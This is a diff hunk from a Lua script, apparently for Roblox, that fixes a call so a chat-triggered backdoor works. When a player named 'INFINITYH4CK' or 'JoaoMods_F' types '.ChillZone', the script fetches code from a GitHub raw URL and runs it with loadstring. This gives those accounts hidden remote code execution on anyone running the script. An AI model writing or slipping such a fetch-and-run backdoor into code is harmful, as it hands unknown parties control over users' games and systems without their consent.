@@ -584,7 +584,7 @@ for _, p in ipairs(Players:GetPlayers()) do
   p.Chatted:Connect(function(msj)
     if p.Name == "INFINITYH4CK" or p.Name == "JoaoMods_F" then
       if msj == ".ChillZone" then
-        loadstring(game,HttpGet("https://raw.githubusercontent.com/JoaoMods26/UWUMAxd/refs/heads/main/ChillZone"))()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/JoaoMods26/UWUMAxd/refs/heads/main/ChillZone"))()
       end
     end
   end)
